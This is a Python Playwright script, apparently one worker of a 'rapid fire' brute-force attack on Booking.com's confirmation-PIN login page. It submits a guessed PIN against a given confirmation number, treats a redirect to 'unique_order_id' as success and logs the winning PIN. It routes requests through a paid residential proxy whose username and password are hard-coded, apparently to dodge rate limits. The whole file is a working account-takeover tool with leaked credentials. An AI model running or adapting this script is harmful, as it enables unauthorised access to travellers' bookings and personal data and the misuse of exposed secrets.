#!/usr/bin/env python3
"""
🚀 SINGLE PIN BOSS AGENT - Rapid Fire Version
Tests exactly 1 PIN for rapid fire attacks
"""

from playwright.sync_api import sync_playwright
import os
import time
import argparse
from datetime import datetime

# --- Configurable parameters ---
parser = argparse.ArgumentParser(description="Booking.com Single PIN tester")
parser.add_argument('--confirmation', type=str, default="5724349472", help='Confirmation number')
parser.add_argument('--pins', type=str, required=True, help='Single PIN to test')
parser.add_argument('--wait', type=int, default=5, help='Wait time (not used in single PIN mode)')
parser.add_argument('--headless', action='store_true', help='Run browser in headless mode')
args = parser.parse_args()

CONFIRMATION = args.confirmation
PIN_TO_TEST = args.pins
HEADLESS = True  # Headless for rapid fire
SCREEN_DIR = "screenshots_rapid_fire"
AGENT_NAME = f"RAPID_FIRE_{PIN_TO_TEST}"

# --- Proxy configuration ---
PROXY_CONFIG = {
    "server": "http://pr.oxylabs.io:7777",
    "username": "customer-1proxylabs_atNPR-cc-us",
    "password": "1proxylabs_atNPR1"
}

os.makedirs(SCREEN_DIR, exist_ok=True)

def test_single_pin():
    """Test a single PIN"""
    print(f"🤖 Agent {AGENT_NAME} testing PIN: {PIN_TO_TEST} on booking: {CONFIRMATION}")
    
    try:
        with sync_playwright() as p:
            browser = p.chromium.launch(headless=HEADLESS, proxy=PROXY_CONFIG)
            page = browser.new_page()

            # Navigate to booking confirmation page
            print(f"🔄 Loading booking page...")
            page.goto("https://secure.booking.com/help/confirmation_pin_auth", wait_until="load", timeout=30000)

            # Wait for form elements
            page.wait_for_selector('input[placeholder="e.g. 1234567890"]', timeout=15000)
            
            # Fill confirmation number
            page.fill('input[placeholder="e.g. 1234567890"]', CONFIRMATION)
            
            # Fill PIN
            page.fill('input[placeholder="e.g. 1234"]', PIN_TO_TEST)

            # Click Continue button
            try:
                page.wait_for_selector('button:has-text("Continue")', timeout=5000)
                page.click('button:has-text("Continue")')
            except Exception:
                page.wait_for_selector('button[type="submit"]', timeout=5000)
                page.click('button[type="submit"]')

            # Wait for result
            page.wait_for_function(
                """
                () => {
                    return location.href.includes('unique_order_id') ||
                           document.querySelector('.bui-alert--error') !== null
                }
                """,
                timeout=30000
            )

            current_url = page.url
            
            if "unique_order_id=" in current_url:
                print(f"🎉 SUCCESS! PIN {PIN_TO_TEST} is CORRECT!")
                print(f"🔗 Success URL: {current_url}")
                page.screenshot(path=f"{SCREEN_DIR}/{CONFIRMATION}_{PIN_TO_TEST}_SUCCESS.png")
                
                # Log success to file
                with open(f"rapid_fire_success_{CONFIRMATION}.txt", "w") as f:
                    f.write(f"SUCCESS|{PIN_TO_TEST}|{current_url}|{datetime.now()}")
                
                browser.close()
                return True
                
            elif page.query_selector('.bui-alert--error'):
                print(f"❌ PIN {PIN_TO_TEST} is incorrect")
                page.screenshot(path=f"{SCREEN_DIR}/{CONFIRMATION}_{PIN_TO_TEST}_FAIL.png")
                browser.close()
                return False
                
            else:
                print(f"❓ Unknown result for PIN {PIN_TO_TEST}")
                page.screenshot(path=f"{SCREEN_DIR}/{CONFIRMATION}_{PIN_TO_TEST}_UNKNOWN.png")
                browser.close()
                return False

    except Exception as e:
        print(f"💥 Error testing PIN {PIN_TO_TEST}: {e}")
        try:
            browser.close()
        except:
            pass
        return False

if __name__ == "__main__":
    success = test_single_pin()
    if success:
        print(f"✅ RAPID FIRE SUCCESS - PIN {PIN_TO_TEST} FOUND!")
    else:
        print(f"❌ RAPID FIRE FAILED - PIN {PIN_TO_TEST} incorrect")
